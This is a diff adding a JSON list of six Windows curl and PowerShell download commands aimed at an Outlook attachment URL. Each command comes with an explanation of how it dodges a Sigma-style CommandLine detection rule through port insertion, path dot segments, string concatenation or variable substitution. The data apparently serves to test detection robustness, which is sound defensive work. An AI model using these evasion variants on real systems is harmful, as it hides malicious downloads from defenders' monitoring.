@@ -1,0 +1,26 @@
+[
+{
+"output": "curl.exe -sSL "[https://attachment.outlook.live.net:443/owa/test.txt](https://attachment.outlook.live.net:443/owa/test.txt)" -o "C:\Temp\test.txt"",
+"explanation": "Recoding: adds the explicit default HTTPS port :443. This is intended to avoid the exact CommandLine|contains domain string '[https://attachment.outlook.live.net/owa/](https://attachment.outlook.live.net/owa/)' while preserving the same high-level download behavior; assumes the remote service accepts the explicit port."
+},
+{
+"output": "curl.exe -sSL "[https://attachment.outlook.live.net/owa/./test.txt](https://attachment.outlook.live.net/owa/./test.txt)" -o "C:\Temp\test.txt"",
+"explanation": "Recoding/path normalization: inserts a dot path segment after /owa/. This keeps the download target logically equivalent in many HTTP servers while avoiding the exact domain/path indicator '[https://attachment.outlook.live.net/owa/test.txt](https://attachment.outlook.live.net/owa/test.txt)'; normalization behavior may depend on the server."
+},
+{
+"output": "powershell.exe -NoProfile -Command "Invoke-WebRequest ('[https://attachment.outlook.live.net](https://attachment.outlook.live.net)' + '/owa/test.txt') -OutFile 'C:\Temp\test.txt'"",
+"explanation": "Recoding/string construction: splits the Office URL into concatenated strings. It still uses Invoke-WebRequest for a simulated download, but avoids the exact CommandLine|contains domain value required by selection_domains."
+},
+{
+"output": "powershell.exe -NoProfile -Command "$u='[https://attachment.outlook.live.net](https://attachment.outlook.live.net)'; iwr ($u + '/owa/test.txt') -OutFile 'C:\Temp\test.txt'"",
+"explanation": "Recoding via variable substitution: stores the domain in a variable and constructs the final URL at runtime. It may match selection_download via iwr, but avoids selection_domains because the full literal Office URL is not present in the command line."
+},
+{
+"output": "powershell.exe -NoProfile -Command "Start-BitsTransfer -Source ('[https://attachment.outlook.live.net](https://attachment.outlook.live.net)' + '/owa/test.txt') -Destination 'C:\Temp\test.txt'"",
+"explanation": "Recoding/string construction: preserves the simulated file download using Start-BitsTransfer, but avoids the exact full domain/path literal in selection_domains by concatenating URL components."
+},
+{
+"output": "powershell.exe -NoProfile -Command "$d='attachment.outlook.live.net'; Invoke-WebRequest ('https://' + $d + '/owa/test.txt') -OutFile 'C:\Temp\test.txt'"",
+"explanation": "Recoding: builds both scheme and host at runtime. This avoids the exact '[https://attachment.outlook.live.net/owa/](https://attachment.outlook.live.net/owa/)' CommandLine condition while maintaining equivalent test download behavior."
+}
+]
